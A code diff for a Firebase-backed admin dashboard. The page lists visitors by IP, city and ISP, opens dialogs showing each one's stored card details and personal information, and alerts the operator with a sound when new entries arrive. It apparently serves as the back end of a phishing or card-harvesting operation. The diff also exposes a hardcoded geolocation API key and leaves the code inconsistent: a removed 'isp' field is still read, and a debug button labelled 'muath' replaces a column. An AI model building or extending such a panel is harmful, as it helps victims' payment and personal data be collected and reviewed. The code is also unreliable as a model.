@@ -23,16 +23,18 @@ import {
   updateDoc,
   query,
   onSnapshot,
+  getDoc,
 } from "firebase/firestore";
 import { onAuthStateChanged, signOut } from "firebase/auth";
 import { CardsByID } from "@/components/cards";
+import PersonalInfoDisplay from "@/components/personal";
 
 interface UserData {
   id: string;
   ip: string;
   country_name: string;
   city: string;
-  isp: string;
+  name: string;
   data?: any;
 }
 interface CardData {
@@ -84,9 +86,7 @@ export default function NotificationsPage() {
   const fetchUserData = async () => {
     setIsLoading(true);
     try {
-      const response = await fetch(
-        "https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4"
-      );
+      const response = await fetch("https://api.ipify.org?format=json");
       const result = await response.json();
       const _id = cleanString(result.ip);
 
@@ -108,6 +108,7 @@ export default function NotificationsPage() {
           }
         });
         setUserData(data);
+        console.log(data.at(0));
         if (data.length > userData.length) {
           playNotificationSound();
           setShowNotification(true);
@@ -191,7 +192,17 @@ export default function NotificationsPage() {
       console.error("Error signing out:", error);
     }
   };
+  async function getData(documentId: string) {
+    const docRef = doc(db, "users", documentId);
+    const docSnap = await getDoc(docRef);
 
+    if (docSnap.exists()) {
+      return docSnap.data();
+    } else {
+      console.log("No such document!");
+      return null;
+    }
+  }
   const handleInfoClick = (user: UserData, infoType: "personal" | "card") => {
     setSelectedUser(user);
     setSelectedInfo(infoType);
@@ -252,7 +263,9 @@ export default function NotificationsPage() {
                 <tr key={user.id} className="border-b border-gray-700">
                   <td className="px-4 py-3">{user.id}</td>
                   <td className="px-4 py-3">{user.ip}</td>
-                  <td className="px-4 py-3">{user.country_name}</td>
+                  <td className="px-4 py-3">
+                    <button onClick={() => getData(user.id)}>muath</button>
+                  </td>
                   <td className="px-4 py-3">{user.city}</td>
                   <td className="px-4 py-3">{user.isp}</td>
                   <td className="px-4 py-3">
@@ -265,6 +278,21 @@ export default function NotificationsPage() {
                               )
                               ? "secondary"
                               : "default"
+                            : "destructive"
+                        }
+                        className="rounded-md cursor-pointer"
+                        onClick={() => handleInfoClick(user, "card")}
+                      >
+                        {user.id ? "بطاقة" : "لا توجد بيانات"}
+                      </Badge>
+                      <Badge
+                        variant={
+                          user.data
+                            ? userData.some(
+                                (card: { id: string }) => card.id === user.id
+                              )
+                              ? "destructive"
+                              : "outline"
                             : "destructive"
                         }
                         className="rounded-md cursor-pointer"
@@ -301,6 +329,22 @@ export default function NotificationsPage() {
             <div className="space-y-2">
               <pre className="whitespace-pre-wrap overflow-x-auto">
                 <CardsByID id={selectedUser.id} />
+              </pre>
+            </div>
+          )}
+        </DialogContent>
+      </Dialog>
+
+      <Dialog open={selectedInfo === "personal"} onOpenChange={closeDialog}>
+        <DialogContent className="bg-gray-800 text-white" dir="rtl">
+          <DialogHeader>
+            <DialogTitle>بيانات المستخدم</DialogTitle>
+            <DialogDescription>تفاصيل البيانات المخزنة</DialogDescription>
+          </DialogHeader>
+          {selectedUser && selectedUser.data && (
+            <div className="space-y-2">
+              <pre className="whitespace-pre-wrap overflow-x-auto">
+                <PersonalInfoDisplay id={selectedUser.id} />
               </pre>
             </div>
           )}
